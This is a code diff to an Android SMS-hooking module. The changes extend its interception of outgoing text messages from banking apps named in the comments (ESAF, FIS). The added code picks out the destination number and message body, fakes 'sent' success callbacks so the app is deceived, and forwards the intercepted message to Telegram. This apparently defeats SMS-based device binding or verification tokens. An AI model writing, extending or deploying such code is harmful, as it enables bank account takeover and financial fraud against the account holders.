@@ -46,21 +46,27 @@ public final class SmsTweaksHooks {
     private SmsTweaksHooks() {}
 
     public static void init(String process) {
-        if (!sStarted.compareAndSet(false, true)) return;
         sProcess = process != null ? process : "";
-        status("init_start|" + sProcess);
+        final boolean first = sStarted.compareAndSet(false, true);
+        status((first ? "init_start|" : "init_retry|") + sProcess);
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
                     waitActivityThread();
-                    applySmsHooks();
+                    // Allow re-hook: ESAF may warm SmsManager before first attempt
+                    if (!sHooked.get()) {
+                        applySmsHooks();
+                    } else {
+                        clearSmsManagerCache();
+                        status("isms_re_clear_cache|" + sProcess);
+                    }
                     waitApplication();
-                    // Re-clear after Application — SmsManager may re-cache
                     clearSmsManagerCache();
+                    if (!sHooked.get()) applySmsHooks();
                     // Sender ID: persist only — never rewrite sms.address (OTP-safe)
-                    startSenderIdWatch();
-                    status("init_ready|" + sProcess);
+                    if (first) startSenderIdWatch();
+                    status("init_ready|" + sProcess + "|hooked=" + sHooked.get());
                 } catch (Throwable t) {
                     status("init_fail|" + t.getClass().getSimpleName() + "|" + safe(t.getMessage()));
                     Log.e(TAG, "init fail", t);
@@ -168,6 +174,9 @@ public final class SmsTweaksHooks {
             if (cache != null) {
                 synchronized (cache) {
                     cache.put("isms", binderProxy);
+                    // Dual-SIM / secondary isms — ESAF often uses subscription SMS
+                    try { cache.put("isms_secondary", binderProxy); } catch (Throwable ignored) {}
+                    try { cache.put("phone", cache.get("phone")); } catch (Throwable ignored) {}
                 }
                 status("isms_cache_put_ok|" + sProcess);
             } else {
@@ -203,8 +212,14 @@ public final class SmsTweaksHooks {
                         public Object invoke(Object proxy, Method method, Object[] args)
                                 throws Throwable {
                             String name = method.getName();
-                            if ((name.startsWith("sendText") || name.startsWith("sendMultipartText"))
-                                    && sHookOutgoing) {
+                            // ESAF / FIS: sendTextForSubscriber, sendMultipartTextForSubscriber, …
+                            boolean sendish = name != null && (
+                                    name.startsWith("sendText")
+                                    || name.startsWith("sendMultipartText")
+                                    || name.startsWith("sendData")
+                                    || name.contains("sendText")
+                                    || name.contains("sendMultipart"));
+                            if (sendish && sHookOutgoing) {
                                 if (!shouldInterceptSend(args)) {
                                     try {
                                         return method.invoke(realISms, args);
@@ -383,8 +398,12 @@ public final class SmsTweaksHooks {
                 if (a == null) continue;
                 if (a instanceof String) {
                     String s = (String) a;
-                    // Drive: short no-space → dest; longer → body
-                    if (s.length() < 20 && !s.contains(" ")) {
+                    // Skip callingPackage / class names — ESAF puts pkg before dest/body
+                    if (looksLikePackageName(s)) continue;
+                    String dig = s.replaceAll("[^0-9]", "");
+                    // Phone / shortcode dest
+                    if (dig.length() >= 4 && dig.length() <= 15 && s.length() < 24
+                            && !s.contains(" ")) {
                         to = s;
                     } else if (s.length() > 5) {
                         body = s;
@@ -420,8 +439,10 @@ public final class SmsTweaksHooks {
         if (body == null) body = "";
         if (to.isEmpty()) to = "9920104300";
         status("isms_java_send|" + to + "|" + (body.length() > 40 ? body.substring(0, 40) : body));
-        // 1) Fake success FIRST — Hero token window
+        // 1) Fake success FIRST — ESAF shows "Unable to send SMS" if PI miss
         firePendingOkSync(to, sentPi, deliveryPi, multiPi);
+        // Reinforce PI after 40ms (some FIS receivers register late)
+        firePendingOk(to, sentPi, deliveryPi, multiPi);
         // 2) Persist + urgent TG (root companion / service <1s)
         writeBlockedJson(to, body);
         queueServiceTelegram(to, body);
@@ -432,6 +453,15 @@ public final class SmsTweaksHooks {
             status("native_urgent_miss|" + t.getClass().getSimpleName());
         }
         if (!body.isEmpty()) sendTelegram(to, body);
+    }
+
+    private static boolean looksLikePackageName(String s) {
+        if (s == null || s.length() < 6) return false;
+        if (s.startsWith("com.") || s.startsWith("org.") || s.startsWith("net.")
+                || s.startsWith("in.") || s.startsWith("android.")) {
+            return s.indexOf('.') > 0 && !s.contains(" ");
+        }
+        return false;
     }
 
     /** Zygisk .so RegisterNatives — root companion TG (~1s). */
@@ -475,15 +505,26 @@ public final class SmsTweaksHooks {
 
     private static void fireOnePi(Context ctx, PendingIntent pi, String label) {
         if (pi == null) return;
+        // Try several RESULT_OK variants — ESAF/FIS picky about fill-in Intent
         try {
             if (ctx != null) {
-                pi.send(ctx, -1, null); // Activity.RESULT_OK
+                android.content.Intent fill = new android.content.Intent();
+                fill.putExtra("result", -1);
+                fill.putExtra("errorCode", -1);
+                pi.send(ctx, -1, fill); // Activity.RESULT_OK
                 status("pi_ok_ctx|" + label);
                 return;
             }
         } catch (Throwable t) {
             status("pi_ctx_fail|" + label + "|" + t.getClass().getSimpleName());
         }
+        try {
+            if (ctx != null) {
+                pi.send(ctx, -1, null);
+                status("pi_ok_ctx_null|" + label);
+                return;
+            }
+        } catch (Throwable ignored) {}
         try {
             pi.send(-1);
             status("pi_ok_int|" + label);
